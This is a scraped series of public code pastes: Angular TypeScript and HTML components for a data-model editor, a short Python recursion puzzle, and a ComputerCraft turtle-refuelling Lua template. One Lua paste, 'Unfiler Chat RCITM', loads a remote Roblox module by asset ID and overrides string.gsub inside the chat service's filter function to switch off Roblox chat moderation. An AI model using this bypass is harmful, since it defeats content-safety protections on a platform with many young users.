      const referenceValueDataObject: EModelObject = this.referenceValueDataObjects.get(reference.values[0].id);
      if (!referenceValueDataObject) {
        return '<n/a>'
      }
      return this.engineeringHelperService.getReferenceValueDisplayLabel(reference, this.detailsFormConfig, referenceValueDataObject);
    } else {
      return '';
    }
  }

  getDetailsFormConfigForEmbeddedObject(embeddedReferenceName: string) {
    return this.engineeringHelperService.getDetailsFormConfigForEmbeddedObject(this.detailsFormConfig, embeddedReferenceName);
  }
}
"
EJ1Ys8LV,Reference Details HTML,Dankan7,HTML,Sunday 18th of June 2023 06:56:18 AM CDT,"<div class=""details-container grid"" *ngIf=""!!displayedSingleReferences && displayedSingleReferences.length > 0"">
  <div *ngFor=""let reference of displayedSingleReferences"" class=""col-12"">
    <div class=""details-entry grid"">
      <div class=""col-2"">{{ featureLabels[reference.name] }}</div>
      <div class=""col-10"">
        <a *ngIf=""getReferenceIsLink(reference) && !isReferenceEmbedded(reference.name)"" [routerLink]=""['./']""
          [queryParams]=""getReferencedItemLinkQueryParams(reference)"">
          {{getReferenceValueDisplayLabel(reference) }}</a>
        <span *ngIf=""!getReferenceIsLink(reference) && !isReferenceEmbedded(reference.name)"">
          <div *ngIf=""!!form && !!form.controls[getFormControlName(reference.name)]"" [formGroup]=""form"">
            <p-dropdown *ngIf=""embeddedObjectReferenceValueOptions.has(getFormControlName(reference.name))""
              formControlName=""{{getFormControlName(reference.name)}}"" [style]=""{'width':'100%'}"" appendTo=""body""
              [options]=""getReferenceDropdownList(reference.name)"" placeholder=""Select {{reference.name}}"" [disabled]=""form.disabled"">
              <ng-template let-item pTemplate=""item"">
                {{item.label}}
                [{{dropDownDataSets.get(item.dataSetId).name}}]
              </ng-template>
              <ng-template let-item pTemplate=""selectedItem"">
                {{item.label}}
                [{{dropDownDataSets.get(item.dataSetId).name}}]
              </ng-template>
            </p-dropdown>
          </div>
        </span>
        <div
          *ngIf=""(isReferenceEmbedded(reference.name) && !!getEmbeddedObjectFromMap(reference.name)) || !reference.id"">
          <div *ngIf=""isPartOfEmbeddedEModelObjectReferences(reference.name); else createButton"">
            <p-accordion class=""row"" [style]=""{'margin-bottom': '10px'}"">
              <p-accordionTab [selected]=""true"">
                <p-header>
                  {{ featureLabels[reference.name] }}
                </p-header>
                <div>
                  <button pButton type=""button"" label=""Delete"" icon=""fa fa-trash"" class=""p-button-danger""
                    style=""float:right; margin-top: 0.5em;""
                    (click)=""confirmEmbeddedObjectDeletion(reference.name)""></button>
                  <app-e-model-object-details
                    [embeddedReferenceOppositeId]=""embeddedReferencesOppositeIds.get(reference.name)""
                    [isRootDataObject]=""false"" [eModelObject]=""getEmbeddedObjectFromMap(reference.name)""
                    [detailsFormConfig]=""getDetailsFormConfigForEmbeddedObject(reference.name)"">
                  </app-e-model-object-details>
                </div>
              </p-accordionTab>
            </p-accordion>
          </div>
          <ng-template #createButton>
            <p-button *ngIf=""!!eModelObject"" class=""col-fixed"" label=""Create"" icon=""pi pi-plus""
              (click)=""createEmbeddedObject(reference.name)"">
            </p-button>
            <app-create-data-object-dialog
              *ngIf=""isEmbeddedDataObjectCreationDialogVisible && !!embeddedReferencesMap.get(reference.name)""
              [dataSetBranch]=""dataSetBranch"" [(visible)]=""isEmbeddedDataObjectCreationDialogVisible""
              [dataObjectId]=""eModelObject.id"" [reference]=""embeddedReferencesMap.get(reference.name)""
              [dataObjectType]=""embeddedReferencesMap.get(reference.name).typeName""
              [dataObjectTypeId]=""embeddedReferencesMap.get(reference.name).typeId""
              [detailsFormConfig]=""getDetailsFormConfigForEmbeddedObject(reference.name)"">
            </app-create-data-object-dialog>
          </ng-template>
        </div>
      </div>
    </div>
  </div>
</div>
<div *ngIf=""!!eModelObject"" class=""col-12"">
  <ng-container *ngIf=""!loading && !!displayedManyReferences && (displayedManyReferences.length > 0)"">
    <p-tabView>
      <ng-container *ngFor=""let eReference of displayedManyReferences; let i = index"">
        <p-tabPanel header=""{{ featureLabels[eReference.name] }}"" [selected]=""i === 0"">
          <app-overview-table [selectorMode]=""'true'"" [dataObjectId]=""eModelObject.id""
            [dataObjectTypeId]=""eReference.typeId"" [dataSetId]=""eModelObject.dataSetId""
            [dataSetBranch]=""eModelObject.dataSetBranch"" [dataModelIncrementId]=""eModelObject.dataModelIncrementId""
            [reference]=""eReference"" [recursiveToggleAllowed]=""true"" [stateContext]=""eModelObject.id"">
          </app-overview-table>
        </p-tabPanel>
        <p-tabPanel *ngIf=""i === (displayedManyReferences.length - 1)"" header=""Attachments"" [selected]=""false"">
          <!-- <app-attachments-overview [dataItemUid]=""eModelObjectUid""></app-attachments-overview> -->
        </p-tabPanel>
      </ng-container>
    </p-tabView>
  </ng-container>
  <ng-container *ngIf=""!shallow && !loading && (!displayedManyReferences || (displayedManyReferences.length === 0))"">
    <p-tabView>
      <p-tabPanel header=""Attachments"">
        <!-- <app-attachments-overview [dataItemUid]=""eModelObjectUid""></app-attachments-overview> -->
      </p-tabPanel>
    </p-tabView>
  </ng-container>
</div>"
7KYen8qL,Unfiler Chat RCITM,DrawingJhon,Lua,Sunday 18th of June 2023 06:54:40 AM CDT,"require(6505718551).NS([==[
local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService)
local env = getfenv(chatservice.InternalApplyRobloxFilter)

env.string = setmetatable({
	gsub = function()
		return """"
	end
}, {
	__index = string,
	__newindex = string,
	__metatable = ""The metatable is locked""
})
]==], game:GetService(""ServerScriptService"")).Name = ""FilterBypass"""
rnTwjPB6,Attribute Details Typescript,Dankan7,TypeScript,Sunday 18th of June 2023 06:54:26 AM CDT,"// (C) Copyright European Space Agency, 2023
import { Component, EventEmitter, Input, OnChanges, OnInit, Output, SimpleChanges } from '@angular/core';
import { AbstractControl, FormBuilder, FormControl, FormGroup } from '@angular/forms';
import { Observable, Subject } from 'rxjs';
import * as jsonLogic from 'json-logic-js';
import { debounceTime } from 'rxjs/operators';
import { DataObjectReference } from 'src/app/app-model/data-set/data-object-reference';
import { EAttribute } from 'src/app/app-model/e-model/e-attribute';
import { EEnumLiteral } from 'src/app/app-model/e-model/e-enum-literal';
import { EModelObject } from 'src/app/app-model/e-model/e-model-object';
import { AttributeService } from 'src/app/services/data-model/attribute-service';
import { ClassService } from 'src/app/services/data-model/class.service';
import { DataRepositoryService } from 'src/app/services/data-repository.service';
import { EngineeringHelperService } from 'src/app/services/engineering-helper.service';
import { SubscriptionTracker } from 'src/app/shared/subscription-tracker';
import { GetAttributeEnumerationLiteralsCommand } from '../app-model/get-attribute-enumeration-literals-command';
import { DataObjectFieldChange } from '../e-model-object-details/e-model-object-details.component';
import { DataSet } from 'src/app/app-model/data-set/data-set';

@Component({
  selector: 'app-e-model-object-attribute-details',
  templateUrl: './e-model-object-attribute-details.component.html',
  styleUrls: ['./e-model-object-attribute-details.component.css']
})
export class EModelObjectAttributeDetailsComponent extends SubscriptionTracker implements OnChanges, OnInit {

  @Output() updateEModelObjectEvent = new EventEmitter<EModelObject>();

  protected readonly saveRequestsSource: Subject<DataObjectFieldChange> = new Subject<DataObjectFieldChange>();
  protected saveRequests$: Observable<DataObjectFieldChange> = this.saveRequestsSource.asObservable();

  static DROPDOWN_INPUT_TYPE: string = 'dropdown';

  @Input() detailsFormConfig: any;
  @Input() eModelObject: EModelObject;
  @Input() dataModelTypeId: string;
  @Input() projectId: string;
  @Input() dataObjectId: string;
  @Input() dataSetId: string;
  @Input() dataSetBranch: string;
  @Input() dataSet: DataSet;

  form: FormGroup;

  loading: boolean = false;
  featureLabels = {};
  eAttributes: EAttribute[];

  attributeDropDownOptions: Map<string, EEnumLiteral[]> = new Map();

  constructor(
    private dataRepositoryService: DataRepositoryService,
    private engineeringHelperService: EngineeringHelperService,
    private fb: FormBuilder,
    private classService: ClassService,
    private attributeService: AttributeService) {
    super();
  }

  ngOnInit(): void {
    this.classService.getAttributes({ classId: this.dataModelTypeId, dataModelIncrementId: this.eModelObject.dataModelIncrementId, recursive: true }).subscribe(eAttributes => {
      this.eAttributes = eAttributes;
      this.createFormWithAttributes();
      this.engineeringHelperService.updateFormEnablement(this.form, this.dataSet);
      this.subscribeAttributeFormControlChanges();
    });
  }

  ngOnChanges(changes: SimpleChanges) {
    if (!!changes) {
      if (!!changes.eModelObject && !changes.eModelObject.firstChange &&
        JSON.stringify(changes.eModelObject.currentValue) !== JSON.stringify(changes.eModelObject.previousValue)) {
        this.eModelObject.references = changes.eModelObject.currentValue.references;
        this.createFormWithAttributes();
        this.subscribeAttributeFormControlChanges();
      }
    }
  }

  protected createFormWithAttributes() {
    this.featureLabels = {};
    this.form = this.fb.group({});
    const attributeConfigNotContainedInEModelObject: any[] = [];
    if (!!this.detailsFormConfig && !!this.detailsFormConfig.attributes) {
      for (const attributeConfig of this.detailsFormConfig.attributes) {
        const eAttribute: EAttribute = this.engineeringHelperService.getEAttribute(this.eModelObject.attributes, attributeConfig.attribute);
        if (!!eAttribute && !eAttribute.many) {
          this.featureLabels[attributeConfig.attribute] = this.engineeringHelperService.getAttributeLabel(attributeConfig);
          const attributeFormControlName = this.buildFormControl(eAttribute, this.form, this.eModelObject);
          if (attributeConfig.inputType === EModelObjectAttributeDetailsComponent.DROPDOWN_INPUT_TYPE) {
            this.loadAttributeDropDownOptions(attributeFormControlName);
          }
        } else if (!eAttribute) {
          attributeConfigNotContainedInEModelObject.push(attributeConfig);
        }
      }

      attributeConfigNotContainedInEModelObject.forEach(notContainedAttributeConfig => {
        const eAttribute = this.eAttributes.find(eAttr => eAttr.name === notContainedAttributeConfig.attribute);
        if (!!eAttribute) {
          this.featureLabels[notContainedAttributeConfig.attribute] = this.engineeringHelperService.getAttributeLabel(notContainedAttributeConfig);
          if (!!eAttribute && !eAttribute.many) {
            const attributeFormControlName = this.buildFormControl(eAttribute, this.form, this.eModelObject);
            if (notContainedAttributeConfig.inputType === EModelObjectAttributeDetailsComponent.DROPDOWN_INPUT_TYPE) {
              this.loadAttributeDropDownOptions(attributeFormControlName);
            }
          }
        }
      });
    } else {
      this.eModelObject.attributes.forEach((eAttribute: EAttribute) => {
        if (eAttribute.id) {
          return;
        }
        this.featureLabels[eAttribute.name] = eAttribute.name;
        this.buildFormControl(eAttribute, this.form, this.eModelObject);
      });
    }
  }

  buildFormControl(eAttribute: EAttribute, formGroup: FormGroup, eModelObject: EModelObject): string {
    if (eAttribute.many) {
      const values = this.engineeringHelperService.getEModelObjectAttributeValue(eModelObject, eAttribute.name);
      for (var pos = 0; pos < values.length; pos++) {
        const value = values[pos];
        const attributeFormControlName = `${pos}-${eAttribute.name}`;
        formGroup.addControl(attributeFormControlName, new FormControl(value));
        return attributeFormControlName;
      }
    } else {
      const fullDataAttr = this.eAttributes.find(fullDataEAttr => fullDataEAttr.name === eAttribute.name);
      const value = this.engineeringHelperService.getEModelObjectAttributeValue(eModelObject, eAttribute.name);
      const attributeFormControlName = `0-${eAttribute.name}`;
      formGroup.addControl(attributeFormControlName,
        new FormControl({
          value: value,
          disabled: !!fullDataAttr ? !fullDataAttr.changeable : false
        }));
      // formGroup.addControl(attributeFormControlName, new FormControl(value));
      return attributeFormControlName;
    }
    return '';
  }

  loadAttributeDropDownOptions(attributeControlName: string) {
    const formControlAttributeName = this.engineeringHelperService.extractFormControlAttributeName(attributeControlName);
    const command: GetAttributeEnumerationLiteralsCommand = {
      classId: this.dataModelTypeId,
      attributeName: formControlAttributeName
    };
    this.attributeService.getAttributeEnumerationLiterals(command).subscribe((enumLiterals: EEnumLiteral[]) => {
      const values = [];
      enumLiterals.forEach(enumLiteral => {
        values.push(enumLiteral.literal);
      });
      this.attributeDropDownOptions.set(attributeControlName, values);
    });
  }

  subscribeAttributeFormControlChanges() {
    Object.keys(this.form.controls).forEach(attribute => {
      this.trackSubscription(this.form.controls[attribute].valueChanges.subscribe(attributeValue => {
        if (!this.loading) {
          this.saveRequestsSource.next({ name: attribute, value: attributeValue });
        }
      }), attribute);
    });
    this.trackSubscription(this.saveRequests$.pipe(debounceTime(200)).subscribe((attributeChange: DataObjectFieldChange) => {
      this.saveAttributeChanges(attributeChange);
    }));
  }

  saveAttributeChanges(attributeChange?: DataObjectFieldChange) {
    const controlToChange: AbstractControl = this.form.get(attributeChange.name);
    if (controlToChange.touched) {
      const formControlAttributeName = this.engineeringHelperService.extractFormControlAttributeName(attributeChange.name);
      const changedAttributeName: string = formControlAttributeName;
      const dataObjectReference: DataObjectReference = {
        projectId: this.projectId,
        dataObjectId: this.eModelObject.id,
        dataSetId: this.eModelObject.dataSetId,
        dataSetBranch: this.eModelObject.dataSetBranch
      };
      this.dataRepositoryService.updateDataObjectAttributeValue(dataObjectReference, changedAttributeName, attributeChange.value, null).subscribe(() => {
        this.engineeringHelperService.setDataObjectAttributeValue(this.eModelObject, changedAttributeName, attributeChange.value);
        this.updateEModelObject(this.eModelObject);
      });
    }
  }

  getAttributeInputType(key: string): string {
    const formControlAttributeName = this.engineeringHelperService.extractFormControlAttributeName(key);
    if (!!this.detailsFormConfig && !!this.detailsFormConfig.attributes) {
      for (const attributeConfig of this.detailsFormConfig.attributes) {
        if (attributeConfig.attribute === formControlAttributeName) {
          return !!attributeConfig.inputType ? attributeConfig.inputType : 'text';
        }
      }
    }
    return 'text';
  }

  getAttributeFeatureLabel(key: string): string {
    const formControlAttributeName = this.engineeringHelperService.extractFormControlAttributeName(key);
    if (formControlAttributeName === null) {
      return '';
    }
    return this.featureLabels[formControlAttributeName];
  }

  getAttributeDropdownList(attributeFormControlName: string): EEnumLiteral[] {
    if (this.attributeDropDownOptions.has(attributeFormControlName)) {
      return this.attributeDropDownOptions.get(attributeFormControlName);
    }
    return [];
  }

  updateEModelObject(eModelObject: EModelObject) {
    this.updateEModelObjectEvent.emit(eModelObject);
  }

  getFormControlKeys(): string[] {
    return Object.keys(this.form.controls);
  }
}
"
ufz7igkP,dem22.n23,Korotkodul,Python,Sunday 18th of June 2023 06:53:13 AM CDT,"def f(a,b):
    if a == b:
        return 1
    if a > b:
        return 0
    return f(a + 1, b) + f(a * 2, b)

print(f(1,10) * f(10, 20))
"
nrtT4cjW,WIP template,JimPlatinum,Lua,Sunday 18th of June 2023 06:51:35 AM CDT,"local MIN_FUEL_LEVEL = 5
local ENDER_CHEST_SLOT = 1

-- Function got fuel?
local function needFuel()
  return turtle.getFuelLevel() < MIN_FUEL_LEVEL
end

-- Function refuel
local function refuel()
  -- Select the Ender Storage chest slot
  turtle.select(ENDER_CHEST_SLOT)
  turtle.dig()
  turtle.place()

-- Search for a lava bucket in the Ender Storage chest
  for slot = 1, 27 do
    local itemDetail = turtle.getItemDetail(slot)
    if itemDetail and itemDetail.name == ""minecraft:lava_bucket"" then
      -- Select the slot with the lava bucket
      turtle.select(slot)
      turtle.suck()
      
      turtle.refuel()
      
      turtle.select(ENDER_CHEST_SLOT)
      turtle.drop()
      turtle.select(slot)
      
      break
    end
  end
  
  -- Remove the Ender Storage chest
  turtle.dig()
 
  -- Search for Ender Chest
  for slot = 1, 16 do
    local itemDetail = turtle.getItemDetail(slot)
    if itemDetail and itemDetail.name == ""enderstorage:ender_storage"" then
      turtle.select(slot)
      turtle.transferTo(ENDER_CHEST_SLOT)
      break
    end
  end
end

-- auto refuel every step frd and clears path
local function frd(steps)
  steps = steps or 1 -- Set default value to 1 if steps is nil
  if needFuel() then
    refuel()
  end
  for _ = 1, steps do
    turtle.dig() -- Dig before moving forward
    turtle.forward()
  end
end

--MAIN PROGRAM--"
